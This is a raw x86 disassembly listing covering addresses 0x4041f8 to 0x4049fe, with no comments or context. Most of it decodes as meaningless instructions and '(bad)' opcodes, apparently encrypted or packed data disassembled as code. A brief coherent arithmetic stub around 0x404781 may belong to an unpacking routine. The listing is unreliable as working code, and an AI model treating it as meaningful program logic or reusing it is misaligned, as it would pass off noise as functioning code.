  4041f8:	and    BYTE PTR [edi-0x3b],bh
  4041fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041fc:	mov    DWORD PTR [eax+0x5c],esi
  4041ff:	jnp    0x4041be
  404201:	in     al,dx
  404202:	xor    BYTE PTR [ecx-0x2a8ffd91],bh
  404208:	adc    bh,BYTE PTR [ecx-0x12]
  40420b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40420c:	add    al,0x4
  40420e:	shl    BYTE PTR [ebp+0x40],cl
  404211:	fcom   st(1)
  404213:	fimul  WORD PTR [ebp-0x5c6fee5]
  404219:	test   eax,0xb983d78d
  40421e:	out    dx,al
  40421f:	pop    es
  404220:	in     eax,dx
  404221:	mov    edx,0x1a3e3424
  404226:	inc    edx
  404227:	test   BYTE PTR [ebx-0x2c],ah
  40422a:	outs   dx,BYTE PTR ds:[esi]
  40422b:	cld    
  40422c:	sbb    eax,0x6fb7d3ce
  404231:	mov    dh,bh
  404233:	xchg   DWORD PTR [eax+0x29],ecx
  404236:	call   0xe89e63dd
  40423b:	add    edx,DWORD PTR ds:0x208fd954
  404241:	xlat   BYTE PTR ds:[ebx]
  404242:	push   ecx
  404243:	and    al,0xbb
  404245:	shl    DWORD PTR [edi],0x75
  404248:	jmp    0x72861775
  40424d:	cld    
  40424e:	adc    al,0x16
  404250:	icebp  
  404251:	imul   edx,DWORD PTR [ebp-0x4d36ce90],0x5b76872a
  40425b:	mov    esp,0x37f7dac9
  404260:	push   es
  404261:	test   eax,0x42536466
  404266:	mov    eax,0xdee362d6
  40426b:	int3   
  40426c:	fwait
  40426d:	repnz hlt 
  40426f:	retfw  0x619a
  404273:	sub    ah,BYTE PTR [ebp+0x7007ef9b]
  404279:	or     al,BYTE PTR [ecx+0x632b21c3]
  40427f:	cmp    ch,al
  404281:	repz adc ebp,DWORD PTR ds:0xb20f4e48
  404288:	(bad)  
  404289:	imul   eax
  40428b:	test   DWORD PTR [eax+0x4e],edx
  40428e:	cmp    DWORD PTR [ecx+ebp*8-0x7e],esi
  404292:	dec    ecx
  404293:	or     al,0x90
  404295:	xor    edi,esi
  404297:	rol    ecx,cl
  404299:	mov    eax,ds:0x16f4eba4
  40429e:	mov    WORD PTR [esi],fs
  4042a0:	leave  
  4042a1:	scas   eax,DWORD PTR es:[edi]
  4042a2:	pop    esp
  4042a3:	ss iret 
  4042a5:	cmp    al,0x9d
  4042a7:	(bad)  
  4042a8:	in     eax,dx
  4042a9:	pop    ecx
  4042aa:	mov    eax,ds:0x19d36cbe
  4042af:	in     eax,dx
  4042b0:	jmp    0x23c:0x49a9dd6f
  4042b7:	sbb    DWORD PTR [ebp+0x79bc915e],ecx
  4042bd:	push   ebp
  4042be:	push   ds
  4042bf:	mov    eax,0x18e23c51
  4042c4:	cmp    DWORD PTR [edi+0x14],ecx
  4042c7:	xchg   edi,eax
  4042c8:	sbb    eax,0x786574a4
  4042cd:	retf   
  4042ce:	cmp    DWORD PTR [edi],esp
  4042d0:	or     eax,0x4258817c
  4042d5:	adc    BYTE PTR [esi-0x1884f9cf],bl
  4042db:	repz cwde 
  4042dd:	mov    ch,0x99
  4042df:	cmp    DWORD PTR [ecx-0x38],ecx
  4042e2:	mov    al,ds:0x260f0f2d
  4042e7:	push   ecx
  4042e8:	or     al,0xcb
  4042ea:	xchg   edi,eax
  4042eb:	ror    DWORD PTR [ecx-0x5f],cl
  4042ee:	pop    ds
  4042ef:	jnp    0x404345
  4042f1:	fwait
  4042f2:	add    eax,0xe46ef3a6
  4042f7:	sub    DWORD PTR [edx+0x76],edx
  4042fa:	mov    ch,0x93
  4042fc:	bound  edi,QWORD PTR [esi]
  4042fe:	mov    dh,0xa5
  404300:	in     al,dx
  404301:	pusha  
  404302:	and    DWORD PTR [eax-0x7],0x57161c0f
  404309:	mov    bl,0x33
  40430b:	xchg   esi,eax
  40430c:	mov    esp,DWORD PTR [edi-0x72]
  40430f:	jg     0x404300
  404311:	stc    
  404312:	not    DWORD PTR [ecx+0xf9ff484]
  404318:	out    0xb5,al
  40431a:	div    bh
  40431c:	das    
  40431d:	sub    bl,al
  40431f:	cwde   
  404320:	mov    ebp,0xe588d0ea
  404325:	ror    DWORD PTR [edx+0xc],1
  404328:	outs   dx,BYTE PTR ds:[esi]
  404329:	cs cmp al,0x14
  40432c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40432d:	mov    ds,WORD PTR [ebx+0x4f36e852]
  404333:	sub    eax,0x4c844859
  404338:	push   ebx
  404339:	jno    0x404395
  40433b:	sub    esp,ecx
  40433d:	or     eax,0x7c2ccc45
  404342:	mov    ah,0xcc
  404344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404345:	cmp    DWORD PTR [ecx+0x5e43f58a],esp
  40434b:	in     al,0xeb
  40434d:	(bad)  [edx+0x1]
  404350:	cmp    cl,BYTE PTR [ebp-0x3a6d1fc0]
  404356:	aam    0xe0
  404358:	ins    BYTE PTR es:[edi],dx
  404359:	push   0x8
  40435b:	mov    al,0xa8
  40435d:	hlt    
  40435e:	sub    bl,bl
  404360:	dec    ch
  404362:	pop    ecx
  404363:	fidivr WORD PTR [esi+eiz*2+0x441b6de1]
  40436a:	shl    DWORD PTR [esi],1
  40436c:	sahf   
  40436d:	test   al,0x42
  40436f:	(bad)  
  404370:	jns    0x404360
  404372:	mov    bh,0x9c
  404374:	push   ecx
  404375:	cs mov ecx,0xbfd94686
  40437b:	mov    eax,ds:0x43118cca
  404380:	fiadd  DWORD PTR [esi-0x2c]
  404383:	mov    ebp,0x265c1856
  404388:	cmp    eax,0xab1e7768
  40438d:	stos   BYTE PTR es:[edi],al
  40438e:	mov    eax,ds:0xdee1660b
  404393:	lock cmp eax,0xa0775699
  404399:	mov    al,ds:0x9df18db9
  40439e:	push   ss
  40439f:	mov    ax,WORD PTR ds:0xa798aab8
  4043a6:	pop    ebx
  4043a7:	xor    BYTE PTR [ebx-0x4022198a],al
  4043ad:	retf   0xb1c0
  4043b0:	in     eax,dx
  4043b1:	and    dl,ah
  4043b3:	nop
  4043b4:	retf   
  4043b5:	imul   ebp,DWORD PTR [ebx-0x62],0x6b
  4043b9:	clc    
  4043ba:	add    ebx,DWORD PTR [ebx-0x846c749]
  4043c0:	shl    BYTE PTR [eax],cl
  4043c2:	gs scas eax,DWORD PTR es:[edi]
  4043c4:	or     al,dl
  4043c6:	jge    0x404360
  4043c8:	jo     0x4043be
  4043ca:	or     esi,DWORD PTR [ebx]
  4043cc:	aam    0xe
  4043ce:	mov    ah,0xb2
  4043d0:	in     al,dx
  4043d1:	shl    BYTE PTR [eax-0x446f8e42],1
  4043d7:	mov    ds:0x7f45e9c7,eax
  4043dc:	imul   eax,ebx,0x545f5ef4
  4043e2:	push   es
  4043e3:	xchg   cl,al
  4043e5:	pop    esi
  4043e6:	in     eax,dx
  4043e7:	mov    eax,0xa65e10ce
  4043ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ed:	dec    ebx
  4043ee:	mov    ebp,DWORD PTR [ecx+0x2a143774]
  4043f4:	cmp    esp,DWORD PTR [ebx+eiz*2+0x51]
  4043f8:	sbb    al,0xde
  4043fa:	fisttp WORD PTR [edi]
  4043fc:	mov    ebx,ecx
  4043fe:	fwait
  4043ff:	push   ebp
  404400:	add    dh,BYTE PTR [ecx-0x5e2af04c]
  404406:	popf   
  404407:	jge    0x40440b
  404409:	(bad)  [esi]
  40440b:	and    eax,0xb729d375
  404410:	(bad)  
  404411:	push   DWORD PTR [edx]
  404413:	dec    ebp
  404414:	dec    ebp
  404415:	dec    ebx
  404416:	xchg   BYTE PTR [edx+0x70307a65],dh
  40441c:	ss je  0x404480
  40441f:	test   al,0x1c
  404421:	test   DWORD PTR [ebx-0x74bc1b10],ebx
  404427:	jmp    0xc7a3d8d0
  40442c:	outs   dx,DWORD PTR ds:[esi]
  40442d:	ret    0xc8a5
  404430:	push   ecx
  404431:	ror    DWORD PTR [ebx],1
  404433:	icebp  
  404434:	dec    esp
  404435:	xor    DWORD PTR [esi+0x10caa6e9],edi
  40443b:	call   0xe5d7f8ba
  404440:	(bad)  
  404442:	loope  0x404488
  404444:	repz or DWORD PTR [edx-0x28],esi
  404448:	inc    edi
  404449:	mov    ch,0xf7
  40444b:	shl    bh,0xd0
  40444e:	and    al,BYTE PTR [eax]
  404450:	out    dx,eax
  404451:	adc    BYTE PTR [ecx],al
  404453:	lods   eax,DWORD PTR ds:[esi]
  404454:	imul   BYTE PTR [ebx-0x2c]
  404457:	mov    bh,0x49
  404459:	push   es
  40445a:	icebp  
  40445b:	push   edi
  40445c:	push   esi
  40445d:	or     al,0x9b
  40445f:	xlat   BYTE PTR ds:[ebx]
  404460:	dec    eax
  404461:	add    ecx,eax
  404463:	and    al,BYTE PTR [ecx-0x4c]
  404466:	ins    DWORD PTR es:[edi],dx
  404467:	or     al,0x8d
  404469:	mov    BYTE PTR ds:0x847f5efe,dl
  40446f:	cwde   
  404470:	xor    eax,0xf35a5e1c
  404475:	dec    edx
  404476:	push   ecx
  404477:	pop    ecx
  404478:	mov    ds:0x33e04aca,eax
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40449e
  404490:	call   0x7e7e:0x185e3c19
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404500
  40449c:	retf   
  40449d:	sub    al,0xf8
  40449f:	test   al,0xf7
  4044a1:	sub    al,0xaa
  4044a3:	mov    edx,0xb0e66aa6
  4044a8:	mov    ?,WORD PTR [esi]
  4044aa:	stc    
  4044ab:	mov    edi,0x372d0d94
  4044b0:	(bad)
  4044b3:	ss clc 
  4044b5:	retf   0xa8a
  4044b8:	loopne 0x4044e3
  4044ba:	xchg   esp,eax
  4044bb:	sbb    DWORD PTR [ecx-0x5e5cd47c],0x8db9e639
  4044c5:	jns    0x4044d2
  4044c7:	push   es
  4044c8:	les    ecx,FWORD PTR [edx]
  4044ca:	mov    ch,0x41
  4044cc:	inc    ebp
  4044cd:	jo     0x404462
  4044cf:	pop    edx
  4044d1:	ret    
  4044d2:	cmp    DWORD PTR [edi],ecx
  4044d4:	pop    ss
  4044d5:	cdq    
  4044d6:	jl     0x4044ff
  4044d8:	or     eax,0xe2c97f8b
  4044dd:	cmp    al,0x49
  4044df:	in     al,0x2
  4044e1:	adc    edx,edx
  4044e3:	or     ch,BYTE PTR [edi+0x594b6077]
  4044e9:	lea    ecx,[ebp+0x2c]
  4044ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ed:	mov    cl,0x80
  4044ef:	inc    ebx
  4044f0:	pop    esp
  4044f1:	psubb  mm0,QWORD PTR [eax]
  4044f4:	jle    0x4044a8
  4044f6:	(bad)  
  4044f7:	sbb    BYTE PTR [esi-0x60],dh
  4044fa:	sub    dh,BYTE PTR [edi+0xa]
  4044fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044fe:	stc    
  4044ff:	arpl   WORD PTR [eax+0x7e405933],dx
  404505:	les    esp,FWORD PTR [ecx]
  404507:	sub    eax,0xcd886a31
  40450c:	les    ebx,FWORD PTR [ebx+0x76394e26]
  404512:	jae    0x40457c
  404514:	into   
  404515:	pop    edx
  404516:	push   es
  404517:	cwde   
  404518:	iret   
  404519:	repnz mov ebp,0xed5766ff
  40451f:	jl     0x4044dc
  404521:	dec    ecx
  404522:	das    
  404523:	adc    DWORD PTR [edx+0xc],esi
  404526:	int    0x21
  404528:	xchg   BYTE PTR [edi+ecx*4],cl
  40452b:	jno    0x4044e2
  40452d:	sub    BYTE PTR [ebx],bl
  40452f:	stos   DWORD PTR es:[edi],eax
  404530:	outs   dx,BYTE PTR ds:[esi]
  404531:	add    ch,BYTE PTR [ebx+0x4ab46006]
  404537:	fmulp  st(3),st
  404539:	test   al,0x69
  40453b:	xchg   esp,eax
  40453c:	mov    eax,0x421c0ecc
  404541:	jns    0x404567
  404543:	imul   esp,esi,0x5838e5
  404549:	inc    esi
  40454a:	stos   DWORD PTR es:[edi],eax
  40454b:	(bad)  
  40454c:	scas   al,BYTE PTR es:[edi]
  40454d:	imul   eax,DWORD PTR [edx+edx*4],0x1e
  404551:	lock cmp BYTE PTR [ecx],0x3a
  404555:	sub    bh,BYTE PTR [edi]
  404557:	cs pop ebp
  404559:	out    0x70,al
  40455b:	stos   BYTE PTR es:[edi],al
  40455c:	std    
  40455d:	xchg   DWORD PTR [eax],ebx
  40455f:	test   esi,esi
  404561:	xor    eax,0xdbe77e38
  404566:	leave  
  404567:	aaa    
  404568:	addr16 pop edi
  40456a:	cmp    bh,BYTE PTR [ebp+0x17]
  40456d:	pushf  
  40456e:	lahf   
  40456f:	stos   BYTE PTR es:[edi],al
  404570:	call   0x1cc7:0xcf28e990
  404577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404578:	aad    0x2e
  40457a:	into   
  40457b:	imul   edx,DWORD PTR [edi],0x360f16d7
  404581:	jmp    0x404520
  404583:	repnz int 0xf1
  404586:	adc    eax,0x56dc85ca
  40458b:	dec    edi
  40458c:	sub    bh,dl
  40458e:	addr16 pop esp
  404590:	jbe    0x404565
  404592:	gs or  edx,edi
  404595:	mov    al,0x78
  404597:	das    
  404598:	(bad)  
  404599:	push   edx
  40459a:	push   es
  40459b:	fs push edi
  40459d:	ret    0x161f
  4045a0:	fwait
  4045a1:	and    BYTE PTR [edx],bh
  4045a3:	adc    ecx,ebx
  4045a5:	ss xchg edx,eax
  4045a7:	dec    edi
  4045a8:	push   ss
  4045a9:	dec    ebp
  4045aa:	push   es
  4045ab:	push   edx
  4045ac:	hlt    
  4045ad:	mov    al,ds:0x611ea6b
  4045b2:	in     al,0x99
  4045b4:	out    dx,eax
  4045b5:	or     BYTE PTR [edx-0x74],bl
  4045b8:	xor    BYTE PTR [ebx+0x2e],0xe8
  4045bc:	push   0x78
  4045be:	sbb    DWORD PTR [edi+0x2a25d983],esp
  4045c4:	jecxz  0x4045f6
  4045c6:	inc    ebx
  4045c7:	ins    DWORD PTR es:[edi],dx
  4045c8:	into   
  4045c9:	dec    edi
  4045ca:	and    eax,0xb67b4ce4
  4045cf:	xlat   BYTE PTR ds:[ebx]
  4045d0:	lea    edi,[esi+edi*1+0x2cfacd4]
  4045d7:	into   
  4045d8:	push   eax
  4045d9:	popf   
  4045da:	dec    ecx
  4045db:	outs   dx,BYTE PTR ds:[esi]
  4045dc:	xlat   BYTE PTR ds:[ebx]
  4045dd:	gs out 0xdb,eax
  4045e0:	in     al,dx
  4045e1:	loope  0x4045e1
  4045e3:	xor    dl,BYTE PTR [esi*2-0x355614c3]
  4045ea:	loopne 0x404584
  4045ec:	sti    
  4045ed:	jno    0x4045c9
  4045ef:	and    ecx,eax
  4045f1:	mov    cl,0x3d
  4045f3:	stos   BYTE PTR es:[edi],al
  4045f4:	and    esi,ebx
  4045f6:	(bad)  
  4045f7:	push   ebx
  4045f8:	push   ebp
  4045f9:	or     BYTE PTR [ebx-0x37],ah
  4045fc:	jg     0x40465e
  4045fe:	enter  0x7cdc,0x93
  404602:	ins    BYTE PTR es:[edi],dx
  404603:	rol    DWORD PTR [edi+0x63],cl
  404606:	or     cl,ah
  404608:	js     0x404678
  40460a:	jb     0x4045c7
  40460c:	neg    DWORD PTR [esi-0x7f]
  40460f:	dec    ebp
  404610:	sahf   
  404611:	ds add al,0x59
  404614:	xor    cl,dl
  404616:	adc    al,0xc2
  404618:	jecxz  0x404645
  40461a:	and    dh,BYTE PTR [edi]
  40461c:	or     DWORD PTR [ebp-0x1f],0xb717305a
  404623:	dec    eax
  404624:	add    BYTE PTR [ebp-0xe],bl
  404627:	es dec esi
  404629:	int3   
  40462a:	adc    cl,cl
  40462c:	sub    eax,0xe33b2495
  404631:	adc    eax,0x8c164566
  404636:	sub    esi,DWORD PTR [ebp-0x1]
  404639:	outs   dx,DWORD PTR ds:[esi]
  40463a:	cmp    bh,BYTE PTR ds:0x1c3a7bda
  404640:	inc    esp
  404641:	adc    edi,ecx
  404643:	fisubr WORD PTR [edi+0x7d]
  404646:	sti    
  404647:	mov    ds:0x518654a2,al
  40464c:	dec    esi
  40464d:	(bad)  
  40464e:	int    0x91
  404650:	xor    eax,esi
  404652:	pop    esi
  404653:	pop    ss
  404654:	inc    ebx
  404655:	mov    al,0xd7
  404657:	push   eax
  404658:	(bad)  
  40465a:	daa    
  40465b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40465c:	push   ebp
  40465d:	in     al,0x5
  40465f:	xchg   ecx,eax
  404660:	adc    al,0x7a
  404662:	mov    eax,0xfa8df34f
  404667:	les    ebx,FWORD PTR [edx-0x75]
  40466a:	xor    DWORD PTR [esp+edx*4-0x16beeb1c],esi
  404671:	ja     0x40461c
  404673:	rcl    ebx,0xb7
  404676:	xchg   ebp,eax
  404677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404678:	retf   
  404679:	bswap  edi
  40467b:	bnd jae 0x40460d
  40467e:	in     eax,dx
  40467f:	inc    esi
  404680:	aas    
  404681:	xchg   ebp,eax
  404682:	xor    bh,ah
  404684:	loopne 0x404685
  404686:	xchg   esi,eax
  404687:	dec    eax
  404688:	jle    0x404674
  40468a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40468b:	sub    DWORD PTR [edx+0x4a],0xffffffda
  40468f:	sbb    ah,BYTE PTR [ebp-0x69b6c826]
  404695:	lds    edx,FWORD PTR [edi+0x146b738]
  40469b:	fdiv   DWORD PTR [eax-0x744b97ee]
  4046a1:	push   es
  4046a2:	pop    ecx
  4046a3:	pop    eax
  4046a4:	push   esi
  4046a5:	dec    esp
  4046a6:	mov    ds:0x97a02db,eax
  4046ab:	xor    ah,bh
  4046ad:	aad    0xd5
  4046af:	stos   BYTE PTR es:[edi],al
  4046b0:	test   BYTE PTR [ebp-0x7e],cl
  4046b3:	mov    bh,0x20
  4046b5:	out    dx,al
  4046b6:	jbe    0x404737
  4046b8:	int    0x5f
  4046ba:	outs   dx,DWORD PTR ds:[esi]
  4046bb:	stos   DWORD PTR es:[edi],eax
  4046bc:	out    0x74,al
  4046be:	pop    ss
  4046bf:	mov    esi,0x455c6dd6
  4046c4:	or     BYTE PTR [ebx-0x5b668a99],bl
  4046ca:	ret    
  4046cb:	xor    DWORD PTR [ecx*2+0x11469f82],edx
  4046d2:	jmp    0xf269:0x825db15a
  4046d9:	push   ecx
  4046da:	sbb    al,0xaa
  4046dc:	add    al,0x7a
  4046de:	or     BYTE PTR [ebx+eax*2-0x536ed1c4],cl
  4046e5:	icebp  
  4046e6:	into   
  4046e7:	push   ds
  4046e8:	mov    cl,0xc1
  4046ea:	fcmovne st,st(1)
  4046ec:	test   ch,cl
  4046ee:	or     eax,0x8110c505
  4046f3:	push   0xbeb79ff3
  4046f8:	lds    ebx,FWORD PTR [edx+ebp*8+0x2bea1741]
  4046ff:	adc    al,0xee
  404701:	repnz pop ebp
  404703:	sbb    eax,0x225433bb
  404708:	icebp  
  404709:	jne    0x40468d
  40470b:	icebp  
  40470c:	div    edi
  40470e:	sbb    eax,ebx
  404710:	sbb    BYTE PTR [ebp+0x66863750],cl
  404716:	fstp   st(7)
  404718:	cli    
  404719:	iret   
  40471a:	jmp    0x1f9f:0xa3501ffc
  404721:	arpl   WORD PTR [edx-0x1b],ax
  404724:	cli    
  404725:	push   0xf24d6fd7
  40472a:	jnp    0x404762
  40472c:	jge    0x40472b
  40472e:	xor    eax,0xfa6ed970
  404733:	je     0x40473b
  404735:	and    eax,0x422bf7b1
  40473a:	js     0x4046df
  40473c:	or     DWORD PTR [ecx-0x5e],0x526a35a
  404743:	dec    eax
  404744:	push   ss
  404745:	sbb    al,0xb1
  404747:	adc    esi,DWORD PTR ds:[ecx]
  40474a:	inc    edx
  40474b:	or     eax,0xaefd0df0
  404750:	pop    eax
  404751:	(bad)  
  404752:	xor    bl,BYTE PTR [edx+ebx*4+0x753b7df3]
  404759:	push   0x22
  40475b:	jmp    0x6c2a:0x2ea5bfa2
  404762:	pusha  
  404763:	push   ebx
  404764:	jae    0x4047a6
  404766:	ins    DWORD PTR es:[edi],dx
  404767:	fbstp  TBYTE PTR [esi]
  404769:	test   BYTE PTR [esi-0x4f],0xaf
  40476d:	int3   
  40476e:	nop
  40476f:	scas   al,BYTE PTR es:[edi]
  404770:	mov    ecx,0xf5267783
  404775:	add    eax,0x50d239ae
  40477a:	bound  ecx,QWORD PTR [edx-0x7f4e62e9]
  404780:	pop    esi
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	lea    esp,[ebx]
  4047b6:	sub    edi,DWORD PTR [eax+0x7e7e27b8]
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047ea
  4047c1:	xchg   ebp,eax
  4047c2:	loopne 0x40474f
  4047c4:	imul   esi,DWORD PTR [edi+ecx*1+0x2],0x5
  4047c9:	das    
  4047ca:	sub    DWORD PTR [edx+0x26],edi
  4047cd:	sub    bh,BYTE PTR [edx]
  4047cf:	not    DWORD PTR [ecx-0x2f692cf8]
  4047d5:	sti    
  4047d6:	mov    ebp,0x72070088
  4047db:	lea    ecx,[edi-0x2db644cb]
  4047e1:	nop
  4047e2:	retf   
  4047e3:	ret    
  4047e4:	ss out 0x7a,eax
  4047e7:	mov    esi,0xf057691b
  4047ec:	js     0x4047c5
  4047ee:	daa    
  4047ef:	imul   esp,DWORD PTR [esi+0x4029e308],0xe7aab6d2
  4047f9:	adc    al,0xd8
  4047fb:	jo     0x4047ce
  4047fd:	shl    bl,cl
  4047ff:	inc    eax
  404800:	pop    eax
  404801:	xor    ebx,DWORD PTR [ecx]
  404803:	dec    edx
  404804:	push   ebp
  404805:	push   ebx
  404806:	call   0x331edc81
  40480b:	call   0xd0e6b31b
  404810:	mov    edi,0x3d1a11e4
  404815:	xchg   edi,eax
  404816:	xchg   DWORD PTR [ecx-0x14],edi
  404819:	mov    edx,0xe38f35a
  40481e:	jmp    0x33175c47
  404823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404824:	mov    ebx,0x39577ad6
  404829:	ret    0x8bab
  40482c:	xor    BYTE PTR ds:0xdfa9dbf5,bh
  404832:	cs nop
  404834:	repz push esi
  404836:	mov    ebp,0xb19913b2
  40483b:	imul   edx,DWORD PTR [eax-0x1db3f1a2],0xa8dd0f14
  404845:	scas   al,BYTE PTR es:[edi]
  404846:	stos   BYTE PTR es:[edi],al
  404847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404848:	jl     0x4047d2
  40484a:	pop    ecx
  40484b:	ret    
  40484c:	das    
  40484d:	add    WORD PTR [ebx-0x47],bx
  404851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404852:	mov    bh,0xc1
  404854:	xchg   esi,eax
  404855:	mov    fs,WORD PTR [eax-0x54]
  404858:	add    BYTE PTR [eax],bl
  40485a:	mov    edi,0x48cf8fba
  40485f:	je     0x4047e7
  404861:	dec    ebp
  404862:	jae    0x4048d7
  404864:	jb     0x404851
  404866:	or     ebx,edi
  404868:	jo     0x40486a
  40486a:	ret    0x88fc
  40486d:	mov    ah,0xa7
  40486f:	test   al,0xa9
  404871:	mov    WORD PTR [eax+0x7f],gs
  404874:	mov    dh,0xe4
  404876:	dec    esi
  404877:	leave  
  404878:	push   0x6d8872be
  40487d:	aad    0xe6
  40487f:	popa   
  404880:	nop
  404881:	or     bh,BYTE PTR [edx+0x58]
  404884:	xlat   BYTE PTR ds:[ebx]
  404885:	jae    0x40487f
  404887:	cld    
  404888:	sub    ecx,esp
  40488a:	pop    ds
  40488b:	shl    BYTE PTR [ebx-0x9],0xe3
  40488f:	test   DWORD PTR [edi+eax*8-0x724d4b0b],esp
  404896:	xchg   esi,eax
  404897:	pop    esi
  404898:	daa    
  404899:	icebp  
  40489a:	cmp    dl,BYTE PTR [ecx-0x11]
  40489d:	xchg   ebp,eax
  40489e:	outs   dx,DWORD PTR ds:[esi]
  40489f:	inc    edx
  4048a0:	in     al,dx
  4048a1:	dec    edi
  4048a2:	(bad)  
  4048a3:	cld    
  4048a4:	cmp    edi,edx
  4048a6:	popa   
  4048a7:	mov    bl,BYTE PTR [ebp+0x7620b0e7]
  4048ad:	jne    0x40490c
  4048af:	xor    eax,0x80b78434
  4048b4:	cs arpl si,si
  4048b7:	shl    DWORD PTR [eax-0x6d],1
  4048ba:	pop    edx
  4048bb:	dec    ebp
  4048bc:	inc    esi
  4048bd:	sbb    eax,0xe3d688aa
  4048c2:	add    BYTE PTR [ecx],al
  4048c4:	cs and al,0x36
  4048c7:	enter  0x3cc2,0xd0
  4048cb:	mov    esi,0x6b9792df
  4048d0:	push   es
  4048d1:	jo     0x4048e7
  4048d3:	psubd  mm7,QWORD PTR [esi]
  4048d6:	shr    DWORD PTR ds:[eax-0x60],0xb7
  4048db:	(bad)  
  4048dc:	lods   eax,DWORD PTR ds:[esi]
  4048dd:	mov    ah,0xbf
  4048df:	cli    
  4048e0:	or     BYTE PTR [ecx-0x48545ef9],dl
  4048e6:	xchg   edi,eax
  4048e7:	ftst   
  4048e9:	add    eax,0x6f43199a
  4048ee:	mov    BYTE PTR [ebx+0x76d1b0f4],bl
  4048f4:	xor    al,0xb4
  4048f6:	sub    DWORD PTR [esi+0x68],edx
  4048f9:	jl     0x40496b
  4048fb:	sub    BYTE PTR [eax-0x50d320a5],al
  404901:	push   0x8a694075
  404906:	or     al,0x3b
  404908:	jmp    0x4048ff
  40490a:	cdq    
  40490b:	and    ecx,edx
  40490d:	sub    al,0x44
  40490f:	push   ebx
  404911:	xor    edx,DWORD PTR [ebx-0x53]
  404914:	jle    0x40496a
  404916:	out    dx,al
  404917:	mov    WORD PTR [edi+ecx*8+0x6ba89b1a],fs
  40491e:	pop    ebx
  40491f:	pop    eax
  404920:	xor    ch,ah
  404922:	hlt    
  404923:	dec    esi
  404924:	jnp    0x4049a4
  404926:	cmp    eax,0x395f429
  40492b:	loope  0x404976
  40492d:	pop    edi
  40492e:	cwde   
  40492f:	xchg   DWORD PTR ds:0x8f453de1,esp
  404935:	push   0x72e291e5
  40493a:	mov    esi,0x966f3b89
  40493f:	jmp    0x4048ea
  404941:	xchg   edi,eax
  404942:	inc    edx
  404943:	cmp    BYTE PTR cs:[edi],0x2e
  404947:	add    eax,0xb7fc15ab
  40494c:	and    ecx,DWORD PTR [esi-0x56]
  40494f:	dec    ebx
  404950:	pop    es
  404951:	inc    edx
  404952:	mov    ds:0xb4f2b27,eax
  404957:	adc    eax,0x824aefa8
  40495c:	gs popf 
  40495e:	pop    esi
  40495f:	mov    esp,0xab519b6
  404964:	sub    ch,0x9b
  404967:	wbinvd 
  404969:	adc    dl,0x80
  40496c:	mov    cl,0xe9
  40496e:	fiadd  WORD PTR [edx]
  404970:	inc    esi
  404971:	retf   
  404972:	jge    0x404995
  404974:	clc    
  404975:	test   BYTE PTR ds:0xe614d7a8,0x40
  40497c:	or     cl,BYTE PTR [ebx+0x4fcc89b5]
  404982:	retf   0x9ac2
  404985:	aam    0xaf
  404987:	push   cs
  404988:	mov    ebx,0x75ef4211
  40498d:	mov    eax,0xfc1c4349
  404992:	ins    DWORD PTR es:[edi],dx
  404993:	js     0x40491b
  404995:	mov    dl,0xa
  404997:	in     al,dx
  404998:	loopne 0x4049ae
  40499a:	and    ebp,DWORD PTR [edi-0x16032eb8]
  4049a0:	pop    ecx
  4049a1:	cmp    esp,DWORD PTR [esi]
  4049a3:	jns    0x40495f
  4049a5:	jns    0x404987
  4049a7:	imul   ecx,DWORD PTR [esi],0x673fa31e
  4049ad:	addr16 (bad) 
  4049b0:	gs iret 
  4049b2:	in     al,dx
  4049b3:	call   0xe4e4:0xb24ba40
  4049ba:	ja     0x47361004
  4049c0:	(bad)
  4049c4:	xor    DWORD PTR [edi+0x10],ebp
  4049c7:	mov    ebp,edx
  4049c9:	lods   al,BYTE PTR ds:[esi]
  4049ca:	xchg   esi,eax
  4049cb:	mov    esi,0x6f827aa7
  4049d0:	mov    dh,0x84
  4049d2:	ficomp DWORD PTR [ecx-0x128e2a24]
  4049d8:	or     al,0x7d
  4049da:	stc    
  4049db:	mov    BYTE PTR [edi+0x2492f88b],bl
  4049e1:	into   
  4049e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e3:	popf   
  4049e4:	adc    BYTE PTR [edi-0x2b],0x90
  4049e8:	fdivr  st(7),st
  4049ea:	inc    edx
  4049eb:	(bad)  
  4049ec:	ds fwait
  4049ee:	xor    eax,DWORD PTR [edi]
  4049f0:	mov    BYTE PTR [ebx+0x14],ch
  4049f3:	jae    0x404a40
  4049f5:	xlat   BYTE PTR ds:[ebx]
  4049f6:	loop   0x4049bc
  4049f8:	inc    edx
  4049f9:	fisub  WORD PTR [edi-0x43]
  4049fc:	pop    es
  4049fd:	inc    ebp
  4049fe:	shr    cl,0x9b
